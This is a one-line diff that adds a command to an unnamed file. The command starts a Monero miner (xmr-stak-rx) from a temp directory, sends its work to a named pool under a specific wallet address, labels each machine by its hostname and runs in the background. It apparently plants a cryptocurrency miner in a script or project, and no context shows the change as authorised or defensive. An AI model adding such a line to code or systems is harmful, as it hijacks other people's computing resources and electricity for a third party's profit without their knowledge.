@@ -1,0 +1,1 @@
+/root/temp/XMR/xmr-stak-rx.exe -o asia1.hellominer.com:4400 -u 82cNwsd6Rx8fZanGdKpXJLaG13NkQrMFxLnoDtTQW61Zea9vbGVFqnXgxuHEG9bUNS6iu2tNFaZaqFN3aSuS8KzyU6dcgXp.${HOSTNAME}/built2281@gmail.com --currency monero -i 0 -p "" -r "" &
